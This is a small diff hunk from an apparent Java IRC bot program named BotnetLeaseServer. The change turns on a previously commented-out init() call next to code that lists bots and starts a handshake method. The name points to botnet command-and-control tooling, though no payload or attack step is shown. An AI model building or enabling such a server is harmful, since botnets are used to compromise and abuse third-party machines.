@@ -125,7 +125,7 @@ public class BotnetLeaseServer extends PircBot {
 				System.out.print("\t" + bots[i].toString());
 			}
 		}
-		//init();
+		init();
 	}
 	
 	private void handshake(String name) {
